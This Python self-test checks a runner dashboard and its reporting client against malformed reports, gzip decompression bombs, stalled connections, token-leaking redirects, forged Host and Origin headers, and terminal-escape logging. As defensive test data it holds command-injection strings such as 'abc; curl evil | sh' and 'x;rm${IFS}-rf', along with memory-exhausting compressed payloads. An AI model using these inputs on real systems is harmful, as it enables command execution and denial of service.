#!/usr/bin/env python3
"""Checks of the dashboard and of the program that reports to it, beyond line (o) of the self-test.

    python3 selftest/dashboard.py

Each fact is one line starting PASS or FAIL; the last line is FAILS=<count>, and the exit code is 1 if any failed.
It starts dashboards of its own on free ports of this machine (127.0.0.1), works in a temporary directory, and
stops and removes everything it started. It spends nothing and needs no agent. It takes about a minute, because
several of its facts are about what happens after a wait.

What it proves is what one runner, one page or one stranger must not be able to do to the others: a report in the
wrong shape cannot stop the page; a report cannot make the dashboard hold far more than was sent; callers that say
nothing cannot shut the others out; the token goes to no address but the one that was set; a name the dashboard was
not given is refused; a refusal is heard by the one refused; nothing is shown twice or cut in the middle, not when
an answer is lost and not when a log is written again; what cannot arrive is named and the rest arrives; a process
that is not a queue is not watched as one; nothing that is not plainly an identifier reaches a command.

The facts about limits, refusals, places, lost answers, logs written again and reports that cannot arrive were
each run as well against a copy of the kit with the thing they prove taken out, and failed there.
"""
import argparse, base64, gzip, hashlib, http.server, json, os, shutil, socket, subprocess, sys, tempfile, threading, time, urllib.error, urllib.request
KIT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SP = tempfile.mkdtemp(prefix="runner-kit-dashboard-")
sys.path.insert(0, KIT + "/bin")
sys.path.insert(0, KIT + "/dashboard")
import runner_report as rr
import serve
FAILS, procs = [], []
NOTES = []      # what the reporter would write in its log, and whether in the queue log too
rr.note = lambda place, text, queue_log=False: NOTES.append((place.project, text, queue_log))
def until(test, seconds=15, every=0.05):
    """Wait for something to become so. True as soon as it is; False if it is not within the time."""
    end = time.time() + seconds
    while time.time() < end:
        if test(): return True
        time.sleep(every)
    return bool(test())
def rss(pid):
    """The memory a process holds, in megabytes, as the system counts it."""
    try: return int(subprocess.run(["ps", "-o", "rss=", "-p", str(pid)], capture_output=True, text=True).stdout.strip() or 0) / 1024
    except (OSError, ValueError): return 0
def dull(lines, width=64):
    """Text that packs to about half: lines of random hexadecimal, as a log of hashes and identifiers has."""
    return "".join(os.urandom(width // 2).hex() + "\n" for _ in range(lines))
def dense(characters):
    """Text that packs to about three quarters."""
    return base64.b64encode(os.urandom(characters * 3 // 4)).decode()
def after(u, rid, was):
    """The lines a page that had seen a runner as it `was` is given next."""
    return [r for r in strict(call(u + "/api/poll?since=%s:%d:%s" % (rid, was["seq"], was["life"]))[1])["runners"] if r["id"] == rid][0]
def runner_of(u, rid): return ([r for r in strict(call(u + "/api/poll")[1])["runners"] if r["id"] == rid] or [{}])[0]
class Between(http.server.BaseHTTPRequestHandler):
    """Something on the way to a dashboard. It hands reports on and their answers back, and can be told to take
    only small ones (as a proxy with a limit does, answering with a page of its own), to lose an answer after the
    dashboard has taken the report, or to hand reports on under another name."""
    def do_POST(self):
        cfg, body = self.server.cfg, self.rfile.read(int(self.headers.get("Content-Length", 0)))
        if cfg.get("limit") and len(body) > cfg["limit"]:
            cfg["refused"] = cfg.get("refused", 0) + 1
            page = b"<html><body><h1>413 Request Entity Too Large</h1></body></html>"
            self.send_response(413); self.send_header("Content-Type", "text/html"); self.send_header("Content-Length", str(len(page))); self.end_headers(); self.wfile.write(page)
            return
        headers = {k: v for k, v in self.headers.items() if k.lower() in ("content-type", "content-encoding", "authorization")}
        if cfg.get("host"): headers["Host"] = cfg["host"]
        try:
            with urllib.request.urlopen(urllib.request.Request(cfg["to"] + self.path, body, headers), timeout=10) as a: status, answer = a.status, a.read()
        except urllib.error.HTTPError as e: status, answer = e.code, e.read()
        if cfg.get("lose") and cfg["lose"](body):
            cfg["lost"] = cfg.get("lost", 0) + 1
            return                  # the dashboard took it; the one who sent it never hears
        self.send_response(status); self.send_header("Content-Type", "application/json"); self.send_header("Content-Length", str(len(answer))); self.end_headers(); self.wfile.write(answer)
    def log_message(self, *a): pass
def between(to, **cfg):
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Between); server.daemon_threads = True
    server.cfg = {"to": to, **cfg}
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return "http://127.0.0.1:%d" % server.server_address[1], server.cfg
def workspace(name, tasks="### 1.1 A task [ ]  M: S medium, R: O high\n"):
    w = tempfile.mkdtemp(dir=SP, prefix="rf-ws-"); os.makedirs(w + "/runs")
    open(w + "/TASKS.md", "w").write(tasks); open(w + "/RUN-ORDER.md", "w").write("1.1\n")
    open(w + "/runner.conf", "w").write("PROJECT=%s\nWORKSPACE='%s'\nREPOS='%s'\n" % (name, w, w))
    os.environ["RUNNER_CONF"] = w + "/runner.conf"
    return w, rr.Place(argparse.Namespace(project="", workspace="", tasks="", order="", runs="", agent="", session=""))
def reporting(place, u, task="1.1"):
    """A reporter at work as it is beside a runner, in a thread; it ends when its `given` is set to 0."""
    rep = rr.Reporter(place, os.getpid(), task)
    t = threading.Thread(target=rr.report_until_done, args=(place, rep, u, ""), daemon=True); t.start()
    return rep, t
def check(name, ok, detail=""):
    print(("PASS " if ok else "FAIL ") + name + ("" if ok else "  <- " + str(detail)[:300])); ok or FAILS.append(name)
def strict(raw):
    def no(c): raise ValueError(c)
    return json.loads(raw, parse_constant=no)
def serve_(*extra, state=None):
    state = state or tempfile.mkdtemp(dir=SP, prefix="rf-state-")
    p = subprocess.Popen([sys.executable, KIT + "/dashboard/serve.py", "--port", "0", "--state-dir", state, *extra], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    procs.append(p)
    return p.stdout.readline().split("on ")[1].split("/ ")[0], state, p
def call(url, body=None, raw=None, method=None, **headers):
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    req = urllib.request.Request(url, data, {"Content-Type": "application/json", **headers} if data is not None else headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as a: return a.status, a.read().decode()
    except urllib.error.HTTPError as e: return e.code, e.read().decode()
    except (urllib.error.URLError, OSError) as e: return 0, "connection: %s" % e      # the server hung up while it was being sent to
import atexit
def tidy():
    for p in procs:
        try: p.terminate()
        except Exception: pass
    shutil.rmtree(SP, ignore_errors=True)
atexit.register(tidy)
TOKEN = "a-token-for-this-test-only"
open(SP + "/token", "w").write(TOKEN + "\n")
# A stand-in for a queue: it only stays alive, under a queue's name.
open(SP + "/run_queue_standin.py", "w").write("import sys, time\ntime.sleep(float(sys.argv[1]))\n")
ok_runner = {"id": "good12345678", "sent": time.time(), "info": {"project": "good"}, "state": "idle", "tasks": {"hash": "h"}}

# ---- one report in the wrong shape cannot stop the page showing the others, now or after a restart
U, ST, P = serve_()
call(U + "/api/ingest", ok_runner)
c1 = call(U + "/api/ingest", raw=b'{"id":"nanrunner1","sent":NaN,"info":{"project":"nan"}}')[0]
c2 = call(U + "/api/ingest", raw=b'{"id":"infrunner1","sent":1e400,"info":{"project":"inf"},"usage":{"cost":1e999},"counts":{"done":"many"}}')[0]
c3 = call(U + "/api/ingest", {"id": "nullrunner1", "info": [], "queue": [None, 5, {"id": 7}, {"id": "1.1", "state": "done"}], "delivered": [None, {"id": 5}, {"id": "1.1"}],
                              "task": "x", "parked": {"a": 1}, "hours": [[1], "x", [3600, 2]], "sessions": [1], "last": {"id": "1.1"}, "deploy": 5, "tasks": 7, "usage": "none"})[0]
raw = call(U + "/api/poll")[1]
try:
    polled = {r["id"]: r for r in strict(raw)["runners"]}; valid = True
except ValueError as e:
    polled, valid = {}, False
n = polled.get("nullrunner1", {})
check("a report holding NaN is refused, and one holding a number too large to be a number is taken without it", (c1, c2) == (400, 200) and valid and polled.get("infrunner1", {}).get("usage", {}).get("cost", 0) is None, (c1, c2, valid))
check("wrong shapes are read into the page's own shape: no null in a list, no row without its id or its time", c3 == 200 and n.get("queue") == [{"id": "1.1", "title": "", "state": "done"}] and n.get("delivered") == [] and n.get("task") is None and n.get("info") == {} and n.get("hours") == [[3600, 2]] and n.get("last") is None and n.get("sessions") == {"work": None, "charge": None}, n)
check("the good runner is still served beside them", "good12345678" in polled)
P.terminate(); P.wait()
json.dump([{"id": "poisoned1234", "report": {"sent": float("nan"), "info": {"project": "old"}, "usage": {"cost": float("inf")}}, "seen": time.time(), "first": 1, "skew": float("nan")}], open(ST + "/runners.json", "w"))
U, ST, P = serve_(state=ST)
try: strict(call(U + "/api/poll")[1]); healed = True
except ValueError: healed = False
check("a state file that already holds NaN is read back clean after a restart", healed)

# ---- the token goes to the address that was set, and nowhere else
seen = []
class Capture(http.server.BaseHTTPRequestHandler):
    def do_GET(self): seen.append((self.path, self.headers.get("Authorization"))); self.send_response(200); self.end_headers(); self.wfile.write(b"{}")
    do_POST = do_GET
    def log_message(self, *a): pass
cap = http.server.HTTPServer(("127.0.0.1", 0), Capture); threading.Thread(target=cap.serve_forever, daemon=True).start()
class Redirect(http.server.BaseHTTPRequestHandler):
    def do_GET(self): self.send_response(302); self.send_header("Location", "http://127.0.0.1:%d/capture" % cap.server_address[1]); self.end_headers()
    do_POST = do_GET
    def log_message(self, *a): pass
red = http.server.HTTPServer(("127.0.0.1", 0), Redirect); threading.Thread(target=red.serve_forever, daemon=True).start()
said = ""
for body in (None, b"x"):
    try: rr.ask("http://127.0.0.1:%d/api/ingest" % red.server_address[1], "SECRET-TOKEN-123", body)
    except rr.Unsent as why: said = str(why)
check("a redirect is not followed, for a question or for a report, so the token reaches no other address", seen == [] and "redirect" in said, (seen, said))

# ---- names and hosts
UT, STT, PT = serve_("--token-file", SP + "/token")
call(UT + "/api/ingest", ok_runner, Authorization="Bearer " + TOKEN)
check("a name can be given by anyone who can open the page, token or no token, as serve.py says", call(UT + "/api/name", {"id": "good12345678", "name": "Mine"})[0] == 200)
UN, _, PN = serve_("--no-renaming"); call(UN + "/api/ingest", ok_runner)
check("with --no-renaming a name is refused, and the page is told not to offer one", call(UN + "/api/name", {"id": "good12345678", "name": "Mine"})[0] == 403 and strict(call(UN + "/api/poll")[1])["renaming"] is False)
check("a name sent from another site is refused by its Origin when the browser sends no Sec-Fetch-Site", call(UT + "/api/name", {"id": "good12345678", "name": "x"}, Origin="http://evil.example")[0] == 403 and call(UT + "/api/name", {"id": "good12345678", "name": "y"}, Origin=UT)[0] == 200)
check("a request sent to a name the dashboard was not given is refused: reading, naming and reporting alike", [call(UT + p, b, Host="attacker.example")[0] for p, b in (("/api/poll", None), ("/", None), ("/api/name", {"id": "good12345678", "name": "x"}), ("/api/ingest", ok_runner))] == [421] * 4)
UA, _, PA = serve_("--allow-host", "dash.example,other.example"); call(UA + "/api/ingest", ok_runner)
check("a name given with --allow-host is answered, as are this machine's own name and a numeric address", [call(UA + "/healthz", Host=h)[0] for h in ("dash.example:8443", "other.example", socket.gethostname().lower(), "127.0.0.1:1", "[::1]:9", "nope.example")] == [200, 200, 200, 200, 200, 421])
# A proxy that hands requests on under its own name for the dashboard, and an older browser that sends only Origin.
via = [call(u + "/api/name", {"id": "good12345678", "name": "Through a proxy"}, Origin=o) for u, o in ((UA, "https://dash.example"), (UA, "https://evil.example"), (UT, "https://dash.example"))]
check("a name from the dashboard's own page is taken when a proxy hands it on under another name, if the owner gave the page's name; any other page is refused and told what to do",
      [v[0] for v in via] == [200, 403, 403] and "--allow-host evil.example" in via[1][1] and runner_of(UA, "good12345678").get("label") == "Through a proxy", via)
UK, STK, PK = serve_(); call(UK + "/api/ingest", ok_runner)
os.chmod(STK, 0o500)
unkept = call(UK + "/api/name", {"id": "good12345678", "name": "Not kept"}); shown_unkept = runner_of(UK, "good12345678").get("label")
os.chmod(STK, 0o700)
kept = call(UK + "/api/name", {"id": "good12345678", "name": "Kept"})[0]
check("a name that cannot be kept is refused, with the reason, and is not shown; once it can be kept it is", unkept[0] == 500 and "could not keep the name" in unkept[1] and shown_unkept == "" and kept == 200 and runner_of(UK, "good12345678").get("label") == "Kept", (unkept, shown_unkept, kept))
BW, bw = between(UA, host="some-name.example")
try: rr.ask(BW + "/api/ingest", "", b"{}"); said = ""
except rr.Unsent as why: said = str(why)
check("a reporter whose dashboard does not know the name it is reached by is told so, and what to do about it", said.startswith("answered 421") and "--allow-host some-name.example" in said, said)

# ---- what a refused sender hears
check("a name longer than a name can be is refused before it is read (413)", call(UT + "/api/name", raw=b'{"id":"good12345678","name":"' + b"x" * 5000 + b'"}')[0] == 413)
def first_words(url, head, part, wait=3):
    """Send the head of a request and only part of its body, as a slow sender would; what comes back within the wait."""
    with socket.create_connection(("127.0.0.1", int(url.rsplit(":", 1)[1]))) as c:
        c.sendall(head + part); c.settimeout(wait)
        try: return c.recv(200).split(b"\r\n")[0].decode()
        except OSError as e: return "nothing: %s" % e
t0 = time.time(); heard = first_words(UT, b"POST /api/ingest HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 1500000\r\n\r\n", b"x" * 10000)
check("a report with no token is refused at once, when only its first bytes have arrived (in %.2fs)" % (time.time() - t0), " 401 " in heard, heard)
big = {**ok_runner, "tasks_md": dense(2_000_000)}     # about a megabyte and a half, packed
try: rr.send(UT, "not-the-token", big); said = "taken"
except rr.Unsent as why: said = str(why)
check("a large report with the wrong token is told that its token is refused, not left with a broken connection", "refused this machine's token" in said, said)
try: rr.send(UT, TOKEN, {**big, "tasks_md": dense(3_500_000)}); said = "taken"
except rr.Unsent as why: said = str(why)
check("a report larger than the dashboard takes is told so, and how much it takes", said.startswith("answered 413: at most"), said)

# ---- what one report can cost the dashboard
UM, _, PM = serve_(); call(UM + "/api/ingest", ok_runner)
check("the values in a report are counted as they are, whatever its texts hold", serve.values_in(rb'{"a":"x,y[{\"}","b":"\\","c":[1,2,{"d":"\\\""}]}') == 14, serve.values_in(rb'{"a":"x,y[{\"}","b":"\\","c":[1,2,{"d":"\\\""}]}'))
packed = lambda raw: gzip.compress(raw, 5)
bombs = {
    "nine megabytes of empty lists": packed(b'{"id":"bomb00000001","x":[' + b"[]," * 3_000_000 + b'[]]}'),
    "a million empty lists": packed(b'{"id":"bomb00000002","x":[' + b"[]," * 1_200_000 + b'[]]}'),
    "a million empty texts": packed(b'{"id":"bomb00000003","x":[' + b'"",' * 1_200_000 + b'""]}'),
    "lists a hundred thousand deep": packed(b'{"id":"bomb00000004","x":' + b"[" * 100_000 + b"]" * 100_000 + b"}"),
    "a number three million digits long": packed(b'{"id":"bomb00000005","info":{"project":"digits"},"sent":' + b"1" * 3_000_000 + b"}"),
    "one text of four million characters": packed(('{"id":"bomb00000006","info":{"project":"long"},"note":"\U0001F600' + "A" * 3_900_000 + '"}').encode()),
}
base, peak, sampling = rss(PM.pid), [0.0], [True]
def sample():
    while sampling[0]: peak[0] = max(peak[0], rss(PM.pid)); time.sleep(0.01)
threading.Thread(target=sample, daemon=True).start()
codes, t0 = {}, time.time()
def throw(name): codes[name] = call(UM + "/api/ingest", raw=bombs[name], **{"Content-Encoding": "gzip"})[0]
for _ in range(2):      # each twice, two at a time, as many as the dashboard reads at once
    pair = [threading.Thread(target=throw, args=(name,)) for name in bombs]
    for t in pair: t.start()
    for t in pair: t.join()
took = time.time() - t0; time.sleep(0.1); sampling[0] = False
grew = peak[0] - base
check("a report sent to cost the dashboard its memory or its time is refused or read for what it is: %d to %d bytes packed, %.1fs for twelve of them" % (min(map(len, bombs.values())), max(map(len, bombs.values())), took),
      [codes[n] for n in bombs] == [413, 413, 413, 413, 200, 200] and took < 20 and runner_of(UM, "bomb00000005").get("sent", 0) is None, (codes, took))
check("and the dashboard held no more than %.0f MB more while it read them (from %.0f MB)" % (grew, base), 0 < peak[0] and grew < 150, (base, peak[0]))
check("a report that unpacks to more than 4 MB is refused", call(UM + "/api/ingest", raw=gzip.compress(b'{"id":"bomb12345678","x":"' + b"A" * (5 * 1024 * 1024) + b'"}'), **{"Content-Encoding": "gzip"})[0] == 413)

# ---- a page is answered while large reports are being taken
heavy = gzip.compress(json.dumps({**ok_runner, "out": {"name": "1.1-20260101-000000.log", "fresh": True, "from": 0, "to": 1_900_000, "text": "\n" * 1_900_000}}).encode(), 1)
busy, slowest, asked = [True], [0.0], [0]
def pour():
    while busy[0]: call(U + "/api/ingest", raw=heavy, **{"Content-Encoding": "gzip"})
pourers = [threading.Thread(target=pour, daemon=True) for _ in range(3)]
for t in pourers: t.start()
time.sleep(0.3); t0 = time.time()
while time.time() - t0 < 2.5:
    t1 = time.time(); code = call(U + "/api/poll")[0]; slowest[0] = max(slowest[0], time.time() - t1); asked[0] += code == 200
busy[0] = False
for t in pourers: t.join()
kept = len(runner_of(U, "good12345678")["lines"])
check("while reports of two million lines each pour in, a page's question is still answered: %d answered in 2.5s, the slowest in %.2fs" % (asked[0], slowest[0]), asked[0] >= 5 and slowest[0] < 1.0, (asked[0], slowest[0]))
check("and of those lines the page is given the last few hundred", 0 < kept <= 400, kept)

# ---- the places
for i in range(205): call(U + "/api/ingest", {"id": "flood%07d" % i, "sent": time.time(), "info": {"project": "f"}})
call(U + "/api/ingest", {**ok_runner, "id": "latecomer123"})
ids = {r["id"] for r in strict(call(U + "/api/poll")[1])["runners"]}
check("when every place on the page is taken, a runner that reports still gets one: the one silent longest gives way", "latecomer123" in ids and len(ids) <= 200, len(ids))
port = int(UA.rsplit(":", 1)[1])
held = [socket.create_connection(("127.0.0.1", port)) for _ in range(64)]    # sixty-four callers that say nothing
time.sleep(0.6); answers = [call(UA + "/healthz")[0] for _ in range(10)]
gone = 0
for h in held:
    h.settimeout(0.05)
    try: gone += h.recv(1) == b""
    except OSError: pass
    h.close()
check("sixty-four callers that connect and say nothing do not shut out the next ten: the one waited on longest gave up its place", answers == [200] * 10 and 1 <= gone <= 10, (answers, gone))
held = [socket.create_connection(("127.0.0.1", port)) for _ in range(64)]    # and sixty-four that begin a request and stop
for h in held: h.sendall(b"POST /api/name HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 40\r\n\r\n{")
time.sleep(0.6); answers = [call(UA + "/healthz")[0] for _ in range(10)]
for h in held: h.close()
check("nor do sixty-four that begin a request and stop", answers == [200] * 10, answers)
class Caller:
    shut = 0
    def shutdown(self, how): self.shut += 1
desk = serve.Server(("127.0.0.1", 0), serve.Handler)
desk.callers = {Caller(): None for _ in range(serve.BUSY)}
all_at_work = desk.admit(Caller())
just_arrived, long_waiting = list(desk.callers)[:2]
desk.callers[just_arrived] = time.monotonic()
only_just = desk.admit(Caller())
desk.callers[long_waiting] = time.monotonic() - 5
newcomer = Caller(); gave_way = desk.admit(newcomer)
check("a place is taken from the caller waited on longest, never from one the dashboard is at work for, nor from one that has only just come",
      (all_at_work, only_just, gave_way) == (False, False, True) and long_waiting.shut == 1 and just_arrived.shut == 0 and long_waiting not in desk.callers and newcomer in desk.callers and len(desk.callers) == serve.BUSY,
      (all_at_work, only_just, gave_way, long_waiting.shut, len(desk.callers)))
desk.server_close()

# ---- the lines
W, place = workspace("lines")
LOG = W + "/runs/1.1-20260101-000000.log"
def shown(u=U, rid=None): return [l[2] for l in runner_of(u, rid or place.id).get("lines", []) if l[1] == "o"]
def cycle(rep, u):
    report, running = rep.build()
    rep.have = rr.send(u, "", report)
# An answer that is lost. The dashboard takes the first lines of a new log, and the reporter never hears that it did.
rr.EVERY = 0.05
def first_lines_of_a_log(body):
    out = json.loads(gzip.decompress(body)).get("out") or {}
    return bool(out.get("fresh") and out.get("text")) and not lossy.get("lost")
LU, lossy = between(U); lossy["lose"] = first_lines_of_a_log
open(LOG, "w").write("attempt 1 of 4: new session abc-123\nb1\nb2\nb3\n")
rep, thread = reporting(place, LU)
arrived = until(lambda: lossy.get("lost") == 1 and shown()[-1:] == ["b3"], 10)
open(LOG, "a").write("b4\n"); until(lambda: shown()[-1:] == ["b4"], 10)
rep.given = 0; thread.join(10)
check("a report that arrives, and whose answer is lost on the way back, is not sent twice: each line is shown once", arrived and shown() == ["attempt 1 of 4: new session abc-123", "b1", "b2", "b3", "b4"] and not thread.is_alive(), (lossy.get("lost"), shown()))
rr.EVERY = 2
rep = rr.Reporter(place, os.getpid(), "1.1")
for _ in range(2): cycle(rep, U)
open(LOG, "a").write("a line with a line separator   a next-line \u0085 a form feed \x0c and a return \r inside\n" + "L" * 600_000 + "\nafter the long line\nno line feed at the end")
for _ in range(4): cycle(rep, U)
got = shown()
check("a line is one row whatever it holds: line separator, next-line, form feed and return do not split it", sum("line separator" in l for l in got) == 1 and "inside" in [l for l in got if "line separator" in l][0], got[5:6])
check("a line of 600,000 characters is one row of its first characters", [len(l) for l in got if l.startswith("LLLL")] == [4000] and got[got.index("after the long line") - 1].startswith("LLLL"), [len(l) for l in got if l.startswith("L")])
check("a last line with no line feed waits while the runner is alive", "no line feed at the end" not in got)
rep.given = 0; rep.task = ""
for _ in range(3): cycle(rep, U)
check("and is delivered once the runner has ended", shown()[-1] == "no line feed at the end", shown()[-2:])
os.rename(LOG, LOG + ".old"); open(LOG, "w").write("x" * 900_000 + "\nreplaced file, line one\nreplaced file, line two\n")
for _ in range(3): cycle(rep, U)
check("a file put in another's place is read from a whole line, not from the middle of one", shown()[-2:] == ["replaced file, line one", "replaced file, line two"], shown()[-3:])
# The same file written again where it lies, longer than it was: a copy put back over a log, say. It keeps its name
# and its number, and the place the dashboard holds falls in the middle of one of its new lines.
again = ["written again, line %04d, and long enough that no old place falls on a line's end" % n for n in range(20000)]
was = runner_of(U, place.id)
with open(LOG, "r+") as f: f.write("\n".join(again) + "\n"); f.truncate()
for _ in range(3): cycle(rep, U)
rows = after(U, place.id, was)["lines"]
check("a file written again where it lies is read from a whole line too, and a rule across the output says so", len(rows) > 100 and rows[0][1] == "m" and all(l[1] == "o" and l[2] in set(again) for l in rows[1:]) and rows[-1][2] == again[-1], [r[1:] for r in rows[:3]])
was = runner_of(U, place.id)
with open(LOG, "w") as f: f.write("cut short and written again, line one\ncut short and written again, line two\n")
for _ in range(2): cycle(rep, U)
rows = after(U, place.id, was)["lines"]
check("a file cut short and written again is shown from its start, under a rule that says the log was written again", [r[1:] for r in rows] == [["m", "again"], ["o", "cut short and written again, line one"], ["o", "cut short and written again, line two"]], [r[1:] for r in rows[:4]])
QL = W + "/runs/queue.log"
open(QL, "w").write("".join("2026-01-01 10:0%d:00 task 1.%d: run_task.sh exit %d\n" % (n, n, n % 2) for n in range(4)))
first_count = dict(rep.build()[0]["usage"])
with open(QL, "r+") as f: f.write("".join("2026-01-02 10:00:%02d task 2.%d: run_task.sh exit 0\n" % (n, n) for n in range(9)))
second_count = rep.build()[0]["usage"]
check("the task runs in a queue log written again are counted afresh, not on top of the old count", (first_count["runs"], first_count["finished"], second_count["runs"], second_count["finished"]) == (4, 2, 9, 9), (first_count, second_count))
life = runner_of(U, place.id)
same, other = after(U, place.id, life), after(U, place.id, {"seq": 3, "life": "anotherlife"})
check("a page's place among the lines is good for one life of the runner only: with another life it starts afresh", same["reset"] is False and same["lines"] == [] and other["reset"] is True and len(other["lines"]) > 3)

# ---- what cannot arrive is named, and the rest arrives
# Something on the way that takes small requests only. First a log too large for it: the pieces come down in size
# until they pass, and every line arrives once.
rr.EVERY = 0.05
UL, _, PL_ = serve_()
NU, narrow = between(UL, limit=6000)
W2, place2 = workspace("narrow-log")
LOG2 = W2 + "/runs/1.1-20260101-000000.log"
text2 = "attempt 1 of 4: new session abc-456\n" + dull(600, 200)
open(LOG2, "w").write(text2)
tail2 = text2.encode()[-rr.TAIL:].split(b"\n", 1)[1].decode().split("\n")[:-1]      # what a reporter starts a log from
del NOTES[:]
rep2, thread2 = reporting(place2, NU)
said2 = []
whole2 = until(lambda: (said2.append(runner_of(UL, place2.id).get("unsent", "")) or shown(UL, place2.id) == tail2), 40)
calm2 = until(lambda: runner_of(UL, place2.id).get("unsent") == "", 10)
notes2 = [n for n in NOTES if n[0] == "narrow-log"]
check("a log too large for something on the way arrives all the same, in smaller pieces, each line once (%d reports turned back on the way)" % narrow.get("refused", 0), whole2 and narrow.get("refused", 0) >= 2, (len(shown(UL, place2.id)), len(tail2), narrow))
check("while it could not arrive, the runner's pane said what was not arriving and why; afterwards it says nothing", any("the session's output" in u and "answered 413" in u for u in said2) and calm2, sorted(set(said2)))
check("the queue log is told once that it is not arriving and once that it is again, and never that the dashboard was lost",
      [n[2] for n in notes2 if "not reaching it" in n[1]].count(True) == 1 and [n[2] for n in notes2 if "reaches it again" in n[1]] == [True] and not any("reached again" in n[1] or "cannot be reached" in n[1] for n in notes2) and len(notes2) <= 8, notes2)
rep2.given = 0; thread2.join(10)
# Then a task file too large for it: the output arrives, the task file is named as what does not, and it is tried
# again less and less often, not with every report.
W3, place3 = workspace("narrow-tasks", "### 1.1 A task [ ]  M: S medium, R: O high\n" + dull(3000))
open(W3 + "/runs/1.1-20260101-000000.log", "w").write("attempt 1 of 4: new session abc-789\nc1\nc2\n")
del NOTES[:]; narrow["refused"] = 0
rep3, thread3 = reporting(place3, NU)
named3 = until(lambda: runner_of(UL, place3.id).get("unsent", "").startswith("the task file, because the dashboard answered 413") and shown(UL, place3.id)[-1:] == ["c2"], 30)
before3 = narrow["refused"]; time.sleep(3); tries3 = narrow["refused"] - before3
check("a task file too large for it is named in the pane as what does not arrive, while the output does", named3 and call(UL + "/api/tasks?id=" + place3.id)[0] == 404, (runner_of(UL, place3.id).get("unsent"), shown(UL, place3.id)))
check("and it is tried again less and less often: %d times in the next three seconds, in which sixty reports went" % tries3, tries3 <= 6, tries3)
narrow["limit"] = None
healed3 = until(lambda: call(UL + "/api/tasks?id=" + place3.id)[0] == 200 and runner_of(UL, place3.id).get("unsent") == "", 20)
check("once it can arrive it does, and the pane stops saying so", healed3 and any("reaches it again" in n[1] for n in NOTES if n[0] == "narrow-tasks"), [n for n in NOTES if n[0] == "narrow-tasks"])
rep3.given = 0; thread3.join(10)
rr.EVERY = 2
long_file = SP + "/long-tasks.md"
open(long_file, "w").write("### 1.1 A task [ ]  M: S medium, R: O high\n" + "a line of the task's text\n" * 80000)
cut = rr.load_tasks(long_file)
check("a task file longer than a dashboard takes is sent cut at a line, and says so", len(cut["text"].encode()) <= rr.MOST_TASKS + 200 and cut["bytes"] > rr.MOST_TASKS and cut["text"].rstrip().endswith("is not shown here.)") and "\na line of the task's text\n\n(This task file" in cut["text"] and cut["hash"] == hashlib.sha1(open(long_file, "rb").read()).hexdigest())

# ---- which process is watched
os.makedirs(W + "/runs/queue.lock"); sleeper = subprocess.Popen(["sleep", "30"]); procs.append(sleeper)
open(W + "/runs/queue.lock/pid", "w").write(str(sleeper.pid))
check("a queue lock that names a process which is not a queue is not taken for the queue", rr.queue_pid(place) == 0)
fake = subprocess.Popen([sys.executable, SP + "/run_queue_standin.py", "30"]); procs.append(fake); time.sleep(0.3)
open(W + "/runs/queue.lock/pid", "w").write(str(fake.pid))
check("and one that names a queue is", rr.queue_pid(place) == fake.pid)
rr.LAST_WORDS = 3
state = {"alive": False}
rep2 = rr.Reporter(place, 1, "")
real_build = rep2.build
rep2.build = lambda: (real_build()[0], state["alive"])
result = {}
t = threading.Thread(target=lambda: result.setdefault("rc", rr.report_until_done(place, rep2, "http://127.0.0.1:9", "")), daemon=True); t.start()
time.sleep(1.5); state["alive"] = True; time.sleep(5)
check("a reporter that has seen its queue end, and then sees a queue running again, stays with it", t.is_alive(), result)
state["alive"] = False; t.join(12)
check("and gives up, saying so, only when the runner has stayed ended for its last-words time", result.get("rc") == 1, result)

# ---- identifiers, the doctor's probe
check("an identifier that is not plainly one is not read from a log", rr.session_in("attempt 1 of 4: new session x;rm${IFS}-rf\n") == "" and rr.session_in("attempt 1 of 4: new session 63447abd-ad04-43c4-90f3-6e91745fda9a\n") == "63447abd-ad04-43c4-90f3-6e91745fda9a")
open(W + "/runs/in-charge", "w").write(json.dumps({"agent": "claude", "id": "abc; curl evil | sh", "at": 1}))
check("nor from a hand-written in-charge file", rr.session_in_charge(place) is None)
rc = subprocess.run([sys.executable, KIT + "/bin/runner_report.py", "--in-charge", "--agent", "claude", "--session", "a b;c"], capture_output=True, text=True, env={**os.environ})
check("nor recorded by --in-charge", rc.returncode != 0 and "identifier" in rc.stderr, rc.stderr[:200])
call(U + "/api/ingest", {**ok_runner, "id": "sess12345678", "sessions": {"work": {"agent": "claude", "id": "x`touch elsewhere`", "task": "1.1"}, "charge": {"agent": "codex", "id": "0199a3c2-7d4e"}}})
s = [r for r in strict(call(U + "/api/poll")[1])["runners"] if r["id"] == "sess12345678"][0]["sessions"]
check("and the dashboard drops one that arrives in a report, keeping the plain one beside it", s["work"] is None and s["charge"]["id"] == "0199a3c2-7d4e", s)
def probe(url, token):
    env = {**os.environ, "RUNNER_DASHBOARD_URL": url, "RUNNER_CONF": "/nonexistent"}
    env.pop("RUNNER_DASHBOARD_TOKEN", None)
    if token: env["RUNNER_DASHBOARD_TOKEN"] = token
    r = subprocess.run([sys.executable, KIT + "/bin/runner_report.py", "--check"], capture_output=True, text=True, env=env, cwd="/")
    return r.returncode, r.stdout.strip()
a, b, c = probe(UT, TOKEN), probe(UT, "wrong"), probe(UT, "")
check("the doctor's probe fails on a wrong token and on a missing one, and passes with the right one", (a[0], b[0], c[0]) == (0, 1, 1) and "refused" in b[1] and "token" in c[1], (a, b, c))
errlog = SP + "/rf-stderr.log"
PL = subprocess.Popen([sys.executable, KIT + "/dashboard/serve.py", "--port", "0", "--state-dir", tempfile.mkdtemp(dir=SP, prefix="rf-state-")], stdout=subprocess.PIPE, stderr=open(errlog, "w"), text=True); procs.append(PL)
port = int(PL.stdout.readline().split("127.0.0.1:")[1].split("/")[0])
with socket.create_connection(("127.0.0.1", port)) as raw_socket:
    raw_socket.sendall(b"GET /nothing-\x1b[31mred\x07-here HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n"); raw_socket.recv(4096)
time.sleep(0.5); logged = open(errlog, "rb").read()
check("a failed request is logged, with nothing in the line that could steer a terminal", b"nothing-" in logged and b"\x1b" not in logged and b"\x07" not in logged, logged[:200])

print("FAILS=%d" % len(FAILS)); sys.exit(1 if FAILS else 0)
